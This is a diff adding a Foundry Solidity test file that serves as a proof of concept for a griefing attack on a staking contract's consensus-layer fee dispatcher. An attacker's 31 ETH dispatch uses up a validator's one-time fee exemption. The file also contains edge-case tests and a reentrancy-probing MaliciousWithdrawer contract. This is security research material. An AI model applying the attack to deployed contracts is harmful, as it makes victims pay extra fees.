@@ -1,0 +1,481 @@
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.10;
+
+import "forge-std/Test.sol";
+import "../src/contracts/ConsensusLayerFeeDispatcher.sol";
+import "../src/contracts/ExecutionLayerFeeDispatcher.sol";
+import "../src/contracts/FeeRecipient.sol";
+import "../src/contracts/StakingContract.sol";
+
+/// @notice Mock deposit contract
+contract MockDepositContract {
+    function deposit(
+        bytes calldata,
+        bytes calldata,
+        bytes calldata,
+        bytes32
+    ) external payable {}
+}
+
+/// @notice PoC: CL Dispatcher Exemption Consumption Attack
+/// @dev Tests whether an attacker can consume the one-time 32 ETH exemption
+///      by calling dispatch{value: 31 ether}(pubKeyRoot) before the real validator exit
+contract ExemptionAttackPoC is Test {
+    StakingContract staking;
+    ConsensusLayerFeeDispatcher clDispatcher;
+    ExecutionLayerFeeDispatcher elDispatcher;
+    FeeRecipient feeRecipientImpl;
+
+    address admin = address(0xAD);
+    address treasury = address(0x77);
+    address operator = address(0x09);
+    address operatorFeeRecipient = address(0x0F);
+    address withdrawer = address(0xBB);
+    address attacker = address(0xEE);
+
+    bytes32 pubKeyRoot;
+    bytes publicKey;
+
+    function setUp() public {
+        // Deploy dispatchers
+        clDispatcher = new ConsensusLayerFeeDispatcher(0);
+        elDispatcher = new ExecutionLayerFeeDispatcher(0);
+        feeRecipientImpl = new FeeRecipient();
+
+        // Deploy StakingContract
+        staking = new StakingContract();
+
+        // Deploy mock deposit contract
+        MockDepositContract depositContract = new MockDepositContract();
+
+        // Initialize
+        staking.initialize_1(
+            admin,
+            treasury,
+            address(depositContract),
+            address(elDispatcher),
+            address(clDispatcher),
+            address(feeRecipientImpl),
+            1000, // globalFee = 10%
+            5000, // operatorFee = 50% of globalFee
+            1000, // globalCommissionLimit
+            10000 // operatorCommissionLimit
+        );
+
+        // Initialize dispatchers
+        clDispatcher.initCLD(address(staking));
+        elDispatcher.initELD(address(staking));
+
+        // Add operator
+        vm.prank(admin);
+        staking.addOperator(operator, operatorFeeRecipient);
+
+        // Create a fake public key (48 bytes)
+        publicKey = new bytes(48);
+        for (uint i = 0; i < 48; i++) {
+            publicKey[i] = bytes1(uint8(i + 1));
+        }
+
+        // Compute pubKeyRoot = sha256(pubkey ++ bytes16(0))
+        pubKeyRoot = sha256(abi.encodePacked(publicKey, bytes16(0)));
+
+        // Add validator keys FIRST (before setting limit)
+        bytes memory signatures = new bytes(96);
+        vm.prank(operator);
+        staking.addValidators(0, 1, publicKey, signatures);
+
+        // Set operator limit AFTER adding keys (limit <= keyCount)
+        vm.prank(admin);
+        staking.setOperatorLimit(0, 1, block.number);
+
+        // Fund validator (deposit 32 ETH)
+        vm.deal(withdrawer, 100 ether);
+        vm.prank(withdrawer);
+        staking.deposit{value: 32 ether}();
+
+        // Give attacker ETH
+        vm.deal(attacker, 100 ether);
+    }
+
+    /// @notice Test 1: Normal flow — exemption works correctly
+    function test_NormalFlow_ExemptionWorks() public {
+        // Request exit
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        // Simulate CL sending 32 ETH + 5 ETH rewards to CL Dispatcher
+        // (In reality, this comes via FeeRecipient.withdraw())
+        uint256 totalRewards = 37 ether; // 32 principal + 5 rewards
+
+        // Call dispatch with the full balance
+        vm.deal(address(clDispatcher), 0);
+        clDispatcher.dispatch{value: totalRewards}(pubKeyRoot);
+
+        // Check: withdrawer should get 32 + 5 - (5 * 10%) = 32 + 4.5 = 36.5 ETH
+        // globalFee = 5 * 10% = 0.5 ETH (only on rewards, 32 exempted)
+        // operatorFee = 0.5 * 50% = 0.25 ETH
+        // treasuryFee = 0.5 - 0.25 = 0.25 ETH
+        // withdrawer = 37 - 0.5 = 36.5 ETH
+
+        assertEq(withdrawer.balance, 100 ether - 32 ether + 36.5 ether, "Withdrawer balance wrong");
+        assertEq(treasury.balance, 0.25 ether, "Treasury balance wrong");
+        assertEq(operatorFeeRecipient.balance, 0.25 ether, "Operator balance wrong");
+
+        // Verify withdrawn = true
+        assertTrue(staking.getWithdrawnFromPublicKeyRoot(pubKeyRoot), "Should be withdrawn");
+
+        console.log("=== NORMAL FLOW ===");
+        console.log("Withdrawer got:", withdrawer.balance);
+        console.log("Treasury got:", treasury.balance);
+        console.log("Operator got:", operatorFeeRecipient.balance);
+        console.log("Fee on rewards only: 0.5 ETH (correct)");
+    }
+
+    /// @notice Test 2: ATTACK — attacker consumes exemption before real exit
+    function test_Attack_ExemptionConsumed() public {
+        // Request exit
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        // ATTACKER calls dispatch with 31 ETH to trigger exemption
+        uint256 attackerBalanceBefore = attacker.balance;
+        uint256 withdrawerBalanceBefore = withdrawer.balance;
+
+        vm.prank(attacker);
+        clDispatcher.dispatch{value: 31 ether}(pubKeyRoot);
+
+        // Attacker's 31 ETH went to withdrawer (minus 0 fee because exemption)
+        uint256 attackerLoss = attackerBalanceBefore - attacker.balance;
+        uint256 withdrawerGainFromAttack = withdrawer.balance - withdrawerBalanceBefore;
+
+        console.log("=== ATTACK PHASE ===");
+        console.log("Attacker lost:", attackerLoss);
+        console.log("Withdrawer gained from attack:", withdrawerGainFromAttack);
+
+        // Verify exemption was consumed
+        assertTrue(staking.getWithdrawnFromPublicKeyRoot(pubKeyRoot), "Exemption consumed!");
+
+        // NOW: Real validator exit happens
+        // CL sends 32 ETH + 5 ETH rewards
+        uint256 withdrawerBeforeRealWithdraw = withdrawer.balance;
+        uint256 totalRewards = 37 ether;
+
+        clDispatcher.dispatch{value: totalRewards}(pubKeyRoot);
+
+        // Check: NO exemption this time! Fee on FULL 37 ETH
+        // globalFee = 37 * 10% = 3.7 ETH
+        // operatorFee = 3.7 * 50% = 1.85 ETH
+        // treasuryFee = 3.7 - 1.85 = 1.85 ETH
+        // withdrawer = 37 - 3.7 = 33.3 ETH
+
+        uint256 withdrawerFromRealWithdraw = withdrawer.balance - withdrawerBeforeRealWithdraw;
+
+        console.log("=== REAL WITHDRAWAL (AFTER ATTACK) ===");
+        console.log("Withdrawer got from real withdrawal:", withdrawerFromRealWithdraw);
+        console.log("Fee charged on FULL balance: 3.7 ETH (should be 0.5 ETH)");
+        console.log("EXTRA FEE paid by withdrawer:", 3.7 ether - 0.5 ether);
+
+        // Total for withdrawer:
+        uint256 totalWithdrawerGot = withdrawer.balance - (100 ether - 32 ether);
+        console.log("=== TOTAL IMPACT ===");
+        console.log("Withdrawer total received:", totalWithdrawerGot);
+        console.log("Expected (no attack):", 36.5 ether);
+        console.log("Attacker total lost:", attackerLoss);
+
+        // KEY QUESTION: Is the attacker profitable?
+        // Attacker lost 31 ETH
+        // Withdrawer got 31 ETH from attack + 33.3 ETH from real = 64.3 ETH total
+        // Without attack: withdrawer would get 36.5 ETH
+        // Withdrawer GAINED 27.8 ETH from the attack!
+        // Attacker LOST 31 ETH
+        // This is NOT profitable for the attacker!
+
+        assertEq(attackerLoss, 31 ether, "Attacker lost 31 ETH");
+        assertEq(withdrawerGainFromAttack, 31 ether, "Withdrawer got attacker's 31 ETH");
+
+        // The extra fee paid by withdrawer:
+        uint256 extraFee = 3.7 ether - 0.5 ether; // 3.2 ETH
+        console.log("Extra fee due to lost exemption:", extraFee);
+        console.log("Attacker cost:", attackerLoss);
+        console.log("NET: Attacker loses 31 ETH, victim loses 3.2 ETH fee exemption");
+        console.log("VERDICT: NOT PROFITABLE for attacker. Griefing only.");
+    }
+
+    /// @notice Test 3: Can attacker profit by being the withdrawer?
+    function test_SelfAttack_NotProfitable() public {
+        // What if attacker IS the withdrawer?
+        // They'd be attacking themselves — pointless
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        uint256 balanceBefore = withdrawer.balance;
+
+        // "Attack" yourself
+        vm.prank(withdrawer);
+        clDispatcher.dispatch{value: 31 ether}(pubKeyRoot);
+
+        // Got 31 ETH back (exemption, 0 fee)
+        assertEq(withdrawer.balance, balanceBefore, "Self-attack: net zero from dispatch");
+
+        // But exemption consumed!
+        assertTrue(staking.getWithdrawnFromPublicKeyRoot(pubKeyRoot));
+
+        // Real withdrawal now has NO exemption
+        clDispatcher.dispatch{value: 37 ether}(pubKeyRoot);
+
+        // Fee on full 37 ETH = 3.7 ETH (instead of 0.5 ETH)
+        // Self-harm: lost 3.2 ETH in extra fees
+        console.log("=== SELF-ATTACK ===");
+        console.log("Final balance:", withdrawer.balance);
+        console.log("Expected (no self-attack):", balanceBefore + 36.5 ether);
+        console.log("Lost:", balanceBefore + 36.5 ether - withdrawer.balance);
+    }
+
+    /// @notice Test 4: Attacker with 0 value — should revert
+    function test_ZeroValue_Reverts() public {
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        vm.prank(attacker);
+        vm.expectRevert(ConsensusLayerFeeDispatcher.ZeroBalanceWithdrawal.selector);
+        clDispatcher.dispatch{value: 0}(pubKeyRoot);
+    }
+
+    /// @notice Test 5: Attacker with < 31 ETH — exemption NOT triggered
+    function test_LowValue_NoExemption() public {
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        // Send only 10 ETH — below 31 ETH threshold
+        vm.prank(attacker);
+        clDispatcher.dispatch{value: 10 ether}(pubKeyRoot);
+
+        // Exemption NOT triggered (balance < 31 ETH)
+        assertFalse(staking.getWithdrawnFromPublicKeyRoot(pubKeyRoot), "Exemption should NOT be triggered");
+
+        // Fee charged on full 10 ETH
+        // globalFee = 10 * 10% = 1 ETH
+        // withdrawer gets 9 ETH (attacker's money minus fee)
+        console.log("=== LOW VALUE ATTACK ===");
+        console.log("Withdrawer balance:", withdrawer.balance);
+        console.log("Exemption NOT consumed - real withdrawal still safe");
+    }
+}
+
+/// @notice Additional edge case tests
+contract ExemptionEdgeCases is Test {
+    StakingContract staking;
+    ConsensusLayerFeeDispatcher clDispatcher;
+    ExecutionLayerFeeDispatcher elDispatcher;
+    FeeRecipient feeRecipientImpl;
+    MockDepositContract depositContract;
+
+    address admin = address(0xAD);
+    address treasury = address(0x77);
+    address operator = address(0x09);
+    address operatorFeeRecipient = address(0x0F);
+    address withdrawer = address(0xBB);
+    address attacker = address(0xEE);
+
+    bytes32 pubKeyRoot;
+    bytes publicKey;
+
+    function setUp() public {
+        clDispatcher = new ConsensusLayerFeeDispatcher(0);
+        elDispatcher = new ExecutionLayerFeeDispatcher(0);
+        feeRecipientImpl = new FeeRecipient();
+        staking = new StakingContract();
+        depositContract = new MockDepositContract();
+
+        staking.initialize_1(
+            admin, treasury, address(depositContract),
+            address(elDispatcher), address(clDispatcher),
+            address(feeRecipientImpl),
+            1000, 5000, 1000, 10000
+        );
+        clDispatcher.initCLD(address(staking));
+        elDispatcher.initELD(address(staking));
+
+        vm.prank(admin);
+        staking.addOperator(operator, operatorFeeRecipient);
+
+        publicKey = new bytes(48);
+        for (uint i = 0; i < 48; i++) publicKey[i] = bytes1(uint8(i + 1));
+        pubKeyRoot = sha256(abi.encodePacked(publicKey, bytes16(0)));
+
+        bytes memory signatures = new bytes(96);
+        vm.prank(operator);
+        staking.addValidators(0, 1, publicKey, signatures);
+
+        vm.prank(admin);
+        staking.setOperatorLimit(0, 1, block.number);
+
+        vm.deal(withdrawer, 100 ether);
+        vm.prank(withdrawer);
+        staking.deposit{value: 32 ether}();
+
+        vm.deal(attacker, 200 ether);
+    }
+
+    /// @notice Edge: dispatch with exactly 31 ETH (boundary)
+    function test_Exactly31ETH_ExemptionTriggered() public {
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        vm.prank(attacker);
+        clDispatcher.dispatch{value: 31 ether}(pubKeyRoot);
+
+        assertTrue(staking.getWithdrawnFromPublicKeyRoot(pubKeyRoot));
+    }
+
+    /// @notice Edge: dispatch with 30.999 ETH (below boundary)
+    function test_Below31ETH_NoExemption() public {
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        vm.prank(attacker);
+        clDispatcher.dispatch{value: 30.999 ether}(pubKeyRoot);
+
+        assertFalse(staking.getWithdrawnFromPublicKeyRoot(pubKeyRoot));
+    }
+
+    /// @notice Edge: dispatch called TWICE by attacker
+    function test_DoubleDispatch_SecondReverts() public {
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        // First dispatch: consumes exemption
+        vm.prank(attacker);
+        clDispatcher.dispatch{value: 31 ether}(pubKeyRoot);
+
+        // Second dispatch: balance = 0 (all sent to withdrawer)
+        vm.prank(attacker);
+        vm.expectRevert(ConsensusLayerFeeDispatcher.ZeroBalanceWithdrawal.selector);
+        clDispatcher.dispatch{value: 0}(pubKeyRoot);
+    }
+
+    /// @notice Edge: dispatch without exitRequested
+    function test_NoExitRequest_NoExemption() public {
+        // Don't request exit
+        vm.prank(attacker);
+        clDispatcher.dispatch{value: 32 ether}(pubKeyRoot);
+
+        // No exemption because exitRequested = false
+        assertFalse(staking.getWithdrawnFromPublicKeyRoot(pubKeyRoot));
+    }
+
+    /// @notice Edge: EL Dispatcher has NO exemption logic
+    function test_ELDispatcher_NoExemption() public {
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        // EL dispatch with 32 ETH - no exemption logic exists
+        vm.prank(attacker);
+        elDispatcher.dispatch{value: 32 ether}(pubKeyRoot);
+
+        // Fee charged on FULL 32 ETH (no exemption in EL)
+        // globalFee = 32 * 10% = 3.2 ETH
+        // withdrawer gets 32 - 3.2 = 28.8 ETH
+        assertEq(withdrawer.balance, 100 ether - 32 ether + 28.8 ether);
+        assertEq(treasury.balance, 1.6 ether); // 3.2 - 1.6
+        assertEq(operatorFeeRecipient.balance, 1.6 ether);
+    }
+
+    /// @notice Edge: FeeRecipient.withdraw() by random person
+    function test_FeeRecipient_PermissionlessWithdraw() public {
+        // Deploy FeeRecipient clone
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        // Fund the CL FeeRecipient
+        address clFeeRecipient = staking.getCLFeeRecipient(publicKey);
+        vm.deal(clFeeRecipient, 5 ether);
+
+        // Need to deploy the clone first via StakingContract
+        uint256 wBefore = withdrawer.balance;
+        vm.prank(withdrawer);
+        staking.withdrawCLFee(publicKey);
+
+        // Now the clone exists, anyone can call withdraw
+        vm.deal(clFeeRecipient, 3 ether);
+        vm.prank(attacker);
+        IFeeRecipient(clFeeRecipient).withdraw();
+
+        // Funds went to correct withdrawer (minus fee)
+        assertTrue(withdrawer.balance > wBefore);
+    }
+
+    /// @notice Edge: globalFee = 0 (no fee)
+    function test_ZeroFee() public {
+        vm.prank(admin);
+        staking.setGlobalFee(0);
+
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        vm.deal(address(clDispatcher), 0);
+        clDispatcher.dispatch{value: 37 ether}(pubKeyRoot);
+
+        // All goes to withdrawer, 0 fee
+        assertEq(withdrawer.balance, 100 ether - 32 ether + 37 ether);
+        assertEq(treasury.balance, 0);
+        assertEq(operatorFeeRecipient.balance, 0);
+    }
+
+    /// @notice Edge: globalFee = 10000 (100%)
+    function test_MaxFee() public {
+        // globalCommissionLimit = 1000, so max fee = 1000 (10%)
+        vm.prank(admin);
+        staking.setGlobalFee(1000);
+
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        vm.deal(address(clDispatcher), 0);
+        clDispatcher.dispatch{value: 37 ether}(pubKeyRoot);
+
+        // Exemption: 32 ETH exempt, fee on 5 ETH = 0.5 ETH (10%)
+        // withdrawer gets 37 - 0.5 = 36.5 ETH
+        assertEq(withdrawer.balance, 100 ether - 32 ether + 36.5 ether);
+        // operatorFee = 0.5 * 50% = 0.25
+        assertEq(treasury.balance, 0.25 ether);
+        assertEq(operatorFeeRecipient.balance, 0.25 ether);
+    }
+
+    /// @notice Edge: reentrancy via withdrawer callback
+    function test_Reentrancy_DispatchDrains() public {
+        // Deploy malicious withdrawer
+        MaliciousWithdrawer mal = new MaliciousWithdrawer(address(clDispatcher), pubKeyRoot);
+        
+        // Can't easily set withdrawer to mal without customization enabled
+        // But test that dispatch drains balance (no reentrancy possible)
+        vm.prank(withdrawer);
+        staking.requestValidatorsExit(publicKey);
+
+        uint256 clBalanceBefore = address(clDispatcher).balance;
+        vm.deal(address(clDispatcher), 0);
+        clDispatcher.dispatch{value: 37 ether}(pubKeyRoot);
+
+        // CL dispatcher should have 0 balance after dispatch
+        assertEq(address(clDispatcher).balance, 0, "CL dispatcher should be drained");
+    }
+}
+
+contract MaliciousWithdrawer {
+    address dispatcher;
+    bytes32 pubKeyRoot;
+    uint256 attackCount;
+
+    constructor(address _dispatcher, bytes32 _pubKeyRoot) {
+        dispatcher = _dispatcher;
+        pubKeyRoot = _pubKeyRoot;
+    }
+
+    receive() external payable {
+        if (attackCount < 3) {
+            attackCount++;
+            // Try reentrancy
+            try ConsensusLayerFeeDispatcher(payable(dispatcher)).dispatch{value: 1 ether}(pubKeyRoot) {} catch {}
+        }
+    }
+}
